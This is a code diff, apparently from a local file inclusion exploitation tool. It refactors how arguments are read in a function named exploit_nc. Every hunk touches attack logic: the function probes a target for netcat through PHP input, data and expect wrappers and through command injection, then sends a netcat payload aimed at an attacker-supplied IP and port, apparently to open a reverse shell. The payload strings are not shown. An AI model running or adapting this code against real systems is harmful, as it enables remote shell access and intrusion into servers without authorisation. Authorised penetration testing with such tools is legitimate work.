@@ -2,7 +2,7 @@
 from src.httpreqs import request
 from src.configs import config
 from src.utils.encodings import encode
-from src.utils.arguments import args
+from src.utils.arguments import ArgumentHandler
 from src.attacks.logPoison import exploit_log_poison
 from src.utils.info import printInfo
 from src.utils import colors
@@ -10,6 +10,7 @@ from src.utils import colors
 
 def exploit_nc(exploit, method, ip, port):
     """Exploit nc"""
+    args = ArgumentHandler()
     url = exploit["GETVAL"]
     post = exploit["POSTVAL"]
 
@@ -26,7 +27,7 @@ def exploit_nc(exploit, method, ip, port):
     if method == "INPUT":
         res, _ = request.REQUEST(
             url.replace(config.tempArg, encode(ncTest)),
-            args.httpheaders,
+            args.args['httpheaders'],
             exploit["POSTVAL"],
             config.proxies,
             "",
@@ -36,7 +37,7 @@ def exploit_nc(exploit, method, ip, port):
             printInfo(ip, port, "nc", "input wrapper")
             request.REQUEST(
                 url.replace(config.tempArg, encode(ncPayload)),
-                args.httpheaders,
+                args.args['httpheaders'],
                 exploit["POSTVAL"],
                 config.proxies,
                 "",
@@ -44,10 +45,10 @@ def exploit_nc(exploit, method, ip, port):
             )
 
     if method == "DATA":
-        if args.mode == "post":
+        if args.args['mode'] == "post":
             res, _ = request.REQUEST(
                 url.replace(config.tempArg, encode(ncTest)),
-                args.httpheaders,
+                args.args['httpheaders'],
                 post,
                 config.proxies,
                 "",
@@ -56,7 +57,7 @@ def exploit_nc(exploit, method, ip, port):
         else:
             res, _ = request.REQUEST(
                 url.replace(config.tempArg, encode(ncTest)),
-                args.httpheaders,
+                args.args['httpheaders'],
                 "",
                 config.proxies,
                 "",
@@ -64,10 +65,10 @@ def exploit_nc(exploit, method, ip, port):
             )
         if "/bin" in res.text and "/nc" in res.text:
             printInfo(ip, port, "nc", "data wrapper")
-            if args.mode == "post":
+            if args.args['mode'] == "post":
                 request.REQUEST(
                     url.replace(config.tempArg, encode(ncPayload)),
-                    args.httpheaders,
+                    args.args['httpheaders'],
                     post,
                     config.proxies,
                     "",
@@ -76,7 +77,7 @@ def exploit_nc(exploit, method, ip, port):
             else:
                 request.REQUEST(
                     url.replace(config.tempArg, encode(ncPayload)),
-                    args.httpheaders,
+                    args.args['httpheaders'],
                     "",
                     config.proxies,
                     "",
@@ -84,10 +85,10 @@ def exploit_nc(exploit, method, ip, port):
                 )
 
     if method == "EXPECT":
-        if args.mode == "post":
+        if args.args['mode'] == "post":
             res, _ = request.REQUEST(
                 url.replace(config.tempArg, encode(ncTest)),
-                args.httpheaders,
+                args.args['httpheaders'],
                 post,
                 config.proxies,
                 "",
@@ -96,7 +97,7 @@ def exploit_nc(exploit, method, ip, port):
         else:
             res, _ = request.REQUEST(
                 url.replace(config.tempArg, encode(ncTest)),
-                args.httpheaders,
+                args.args['httpheaders'],
                 "",
                 config.proxies,
                 "",
@@ -104,10 +105,10 @@ def exploit_nc(exploit, method, ip, port):
             )
         if "/bin" in res.text and "/nc" in res.text:
             printInfo(ip, port, "nc", "expect wrapper")
-            if args.mode == "post":
+            if args.args['mode'] == "post":
                 request.REQUEST(
                     url.replace(config.tempArg, encode(ncPayload)),
-                    args.httpheaders,
+                    args.args['httpheaders'],
                     post,
                     config.proxies,
                     "",
@@ -116,7 +117,7 @@ def exploit_nc(exploit, method, ip, port):
             else:
                 request.REQUEST(
                     url.replace(config.tempArg, encode(ncPayload)),
-                    args.httpheaders,
+                    args.args['httpheaders'],
                     "",
                     config.proxies,
                     "",
@@ -129,10 +130,10 @@ def exploit_nc(exploit, method, ip, port):
         )
 
     if method == "CMD":
-        if args.mode == "post":
+        if args.args['mode'] == "post":
             res, _ = request.REQUEST(
                 url,
-                args.httpheaders,
+                args.args['httpheaders'],
                 post.replace(config.tempArg, encode(ncTest)),
                 config.proxies,
                 "",
@@ -141,7 +142,7 @@ def exploit_nc(exploit, method, ip, port):
         else:
             res, _ = request.REQUEST(
                 url.replace(config.tempArg, encode(ncTest)),
-                args.httpheaders,
+                args.args['httpheaders'],
                 "",
                 config.proxies,
                 "",
@@ -149,10 +150,10 @@ def exploit_nc(exploit, method, ip, port):
             )
         if "/bin" in res.text and "/nc" in res.text:
             printInfo(ip, port, "nc", "command injection")
-            if args.mode == "post":
+            if args.args['mode'] == "post":
                 request.REQUEST(
                     url,
-                    args.httpheaders,
+                    args.args['httpheaders'],
                     post.replace(config.tempArg, encode(ncPayload)),
                     config.proxies,
                     "",
@@ -161,7 +162,7 @@ def exploit_nc(exploit, method, ip, port):
             else:
                 request.REQUEST(
                     url.replace(config.tempArg, encode(ncPayload)),
-                    args.httpheaders,
+                    args.args['httpheaders'],
                     "",
                     config.proxies,
                     "",
